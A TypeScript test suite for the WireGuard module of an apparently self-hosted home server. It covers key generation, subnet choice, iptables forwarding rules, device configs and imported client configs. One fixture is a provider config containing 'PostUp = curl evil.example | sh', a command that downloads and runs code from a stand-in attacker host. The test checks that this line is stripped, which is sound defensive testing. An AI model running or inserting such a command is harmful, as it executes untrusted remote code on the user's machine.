import { expect, test } from "bun:test";
import { cleanEndpoint, cleanName, deviceConf, firewall, keyPair, nextAddress, parseDump, pickSubnet, readClientConf, serverConf, type Device } from "../src/wireguard";

const K = (c: string) => c.repeat(43) + "=";
const device = (n: number, lan: boolean): Device => ({ id: "d" + n, name: n === 2 ? "Phone" : "Laptop\nx", address: `10.77.0.${n}`, publicKey: K("p"), privateKey: K("s"), presharedKey: K("h"), lan, createdAt: 0 });
const server = { enabled: true, port: 51820, endpoint: "home.example.com", subnet: "10.77.0", privateKey: K("S"), publicKey: K("P"), devices: [device(2, false), device(3, true)] };

test("keys are made as WireGuard writes them", async () => {
  const pair = await keyPair();
  expect(pair.privateKey).toMatch(/^[A-Za-z0-9+/]{43}=$/);
  expect(pair.publicKey).toMatch(/^[A-Za-z0-9+/]{43}=$/);
  expect(pair.privateKey).not.toBe(pair.publicKey);
  expect((await keyPair()).privateKey).not.toBe(pair.privateKey);
});

test("the tunnel's network keeps clear of the networks the machine is on", () => {
  expect(pickSubnet(["192.168.1.0/24"])).toBe("10.77.0");
  expect(pickSubnet(["10.77.0.0/24", "10.78.5.0/24"])).toBe("10.79.0");
  expect(pickSubnet(["10.0.0.0/8"])).toBe("172.31.77");
  expect(nextAddress("10.77.0", [])).toBe("10.77.0.2");
  expect(nextAddress("10.77.0", [{ address: "10.77.0.2" }, { address: "10.77.0.4" }])).toBe("10.77.0.3");
  expect(nextAddress("10.77.0", Array.from({ length: 253 }, (_, i) => ({ address: `10.77.0.${i + 2}` })))).toBeNull();
});

test("the server's file: a peer per device, and only the allowed ones pass into the home network", () => {
  const conf = serverConf(server, true);
  expect(conf).toContain("Address = 10.77.0.1/24\nListenPort = 51820\n");
  // a chain of Hata's own, filled in the order it is asked: who may pass, then nobody
  const up = conf.split("\n").filter((line) => line.startsWith("PostUp = iptables")).map((line) => line.slice(9));
  expect(up).toEqual([
    "iptables -N HATA-WG 2>/dev/null; iptables -F HATA-WG",
    "iptables -A HATA-WG -o %i -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT",
    "iptables -A HATA-WG -i %i -s 10.77.0.3 -j ACCEPT",
    "iptables -A HATA-WG -i %i -j DROP",
    "iptables -C FORWARD -j HATA-WG 2>/dev/null || iptables -I FORWARD -j HATA-WG",
    "iptables -t nat -C POSTROUTING -s 10.77.0.0/24 ! -o %i -j MASQUERADE 2>/dev/null || iptables -t nat -I POSTROUTING -s 10.77.0.0/24 ! -o %i -j MASQUERADE",
  ]);
  expect(conf).not.toContain("-s 10.77.0.2 -j ACCEPT");
  expect(conf).toContain("PostDown = iptables -D FORWARD -j HATA-WG; iptables -F HATA-WG; iptables -X HATA-WG; true");
  expect(conf.match(/\[Peer\]/g)).toHaveLength(2);
  expect(conf).toContain("# Laptop x\n[Peer]\n");
  expect(conf).toContain("AllowedIPs = 10.77.0.3/32");
  // nobody goes further than the server: nothing is disguised, and what an earlier start left is taken away
  const closed = serverConf({ ...server, devices: [device(2, false)] }, true);
  expect(closed).toContain("iptables -A HATA-WG -i %i -j DROP");
  expect(closed).not.toContain("-I POSTROUTING");
  expect(closed).toContain("PostUp = iptables -t nat -D POSTROUTING -s 10.77.0.0/24 ! -o %i -j MASQUERADE 2>/dev/null; true");
  expect(closed).not.toContain("ip_forward");
  // the same rules for a tunnel that is up, by its name
  expect(firewall({ subnet: "10.77.0", devices: [device(3, true)] }, "hata-wg").up[2]).toBe("iptables -A HATA-WG -i hata-wg -s 10.77.0.3 -j ACCEPT");
  expect(serverConf(server, false)).not.toContain("iptables");
});

test("a device's file: the server alone, or the home network with it", () => {
  expect(deviceConf(device(2, false), server, ["192.168.1.0/24"])).toBe(`[Interface]\nPrivateKey = ${K("s")}\nAddress = 10.77.0.2/32\n\n[Peer]\nPublicKey = ${K("P")}\nPresharedKey = ${K("h")}\nEndpoint = home.example.com:51820\nAllowedIPs = 10.77.0.1/32\nPersistentKeepalive = 25\n`);
  expect(deviceConf(device(3, true), server, ["192.168.1.0/24", "192.168.2.0/24"])).toContain("AllowedIPs = 10.77.0.0/24, 192.168.1.0/24, 192.168.2.0/24\n");
  expect(deviceConf(device(2, false), { ...server, endpoint: "2001:db8::5" }, [])).toContain("Endpoint = [2001:db8::5]:51820\n");
  // it has to fit the code a phone reads
  expect(deviceConf(device(3, true), { ...server, endpoint: "a-rather-long-name.of-a-home.example.com" }, ["192.168.1.0/24", "192.168.100.0/24"]).length).toBeLessThan(666);
});

test("names and addresses typed in", () => {
  expect(cleanName("  My   phone ")).toBe("My phone");
  expect(cleanName("Телефон Олі")).toBe("Телефон Олі");
  for (const bad of ["", " ", "a\x00b", "x".repeat(41), 5]) expect(cleanName(bad)).toBeNull();
  expect(cleanEndpoint(" Home.Example.com ")).toBe("home.example.com");
  expect(cleanEndpoint("203.0.113.7")).toBe("203.0.113.7");
  expect(cleanEndpoint("[2001:db8::5]")).toBe("2001:db8::5");
  expect(cleanEndpoint("")).toBe("");
  for (const bad of ["home.example.com:51820", "https://home", "a b", "-x.com", 5]) expect(cleanEndpoint(bad)).toBeNull();
});

test("somebody else's file is taken without its commands and its DNS", () => {
  const given = readClientConf(`# from the provider\n[Interface]\nPrivateKey = ${K("a")}\nAddress = 10.8.0.5/32, fd00::5/128\nDNS = 10.8.0.1\nPostUp = curl evil.example | sh\nMTU = 1380\n\n[Peer]\nPublicKey = ${K("b")} ; theirs\nEndpoint = vpn.example.com:51820\nAllowedIPs = 10.8.0.0/24\nAllowedIPs = 192.168.50.0/24\nPersistentKeepalive = 25\n`);
  if (typeof given === "string") throw new Error(given);
  expect(given.dropped).toEqual(["DNS", "PostUp"]);
  expect(given.text).not.toContain("curl");
  expect(given.text).not.toContain("DNS");
  expect(given.text).toContain(`[Interface]\nPrivateKey = ${K("a")}\nAddress = 10.8.0.5/32, fd00::5/128\nMTU = 1380\n\n[Peer]\nPublicKey = ${K("b")}\n`);
  expect(given).toMatchObject({ address: "10.8.0.5/32, fd00::5/128", endpoint: "vpn.example.com:51820", allowed: ["10.8.0.0/24", "192.168.50.0/24"], everything: false });
  // what Hata wrote reads back the same
  expect(readClientConf(given.text)).toMatchObject({ text: given.text, dropped: [] });
  const all = readClientConf(`[Interface]\nPrivateKey=${K("a")}\nAddress=10.8.0.5\n[Peer]\nPublicKey=${K("b")}\nEndpoint=1.2.3.4:51820\nAllowedIPs=0.0.0.0/0, ::/0\n`);
  expect(all).toMatchObject({ everything: true });
  expect(readClientConf(`[Interface]\nPrivateKey = short\nAddress = 10.8.0.5\n`)).toBe("wireguard.badKey");
  expect(readClientConf(`[Interface]\nPrivateKey = ${K("a")}\nAddress = 10.8.0.5\n`)).toBe("wireguard.onePeer");
  expect(readClientConf(`[Interface]\nPrivateKey = ${K("a")}\n[Peer]\nPublicKey = ${K("b")}\nEndpoint = h:1\nAllowedIPs = 10.0.0.0/8\n`)).toBe("wireguard.incomplete");
  expect(readClientConf(`[Interface]\nPrivateKey = ${K("a")}\nAddress = 1.1.1.1\n[Peer]\nPublicKey = ${K("b")}\nEndpoint = h:1\nAllowedIPs = 10.0.0.0/8\n[Peer]\nPublicKey = ${K("c")}\nEndpoint = h:2\nAllowedIPs = 10.1.0.0/16\n`)).toBe("wireguard.onePeer");
  for (const bad of ["hello", "[Section]\nA = b", "Key = before any section", 5, "x".repeat(20000)]) expect(readClientConf(bad)).toBe("wireguard.badConf");
});

test("what wg tells about the peers", () => {
  const dump = `${K("S")}\t${K("P")}\t51820\toff\n${K("p")}\t${K("h")}\t203.0.113.9:40123\t10.77.0.2/32\t1791930000\t1024\t2048\t25\n${K("q")}\t${K("h")}\t(none)\t10.77.0.3/32\t0\t0\t0\toff\n`;
  expect(parseDump(dump)).toEqual([
    { publicKey: K("p"), endpoint: "203.0.113.9:40123", handshake: 1791930000000, received: 1024, sent: 2048 },
    { publicKey: K("q"), endpoint: "", handshake: 0, received: 0, sent: 0 },
  ]);
  expect(parseDump("")).toEqual([]);
});
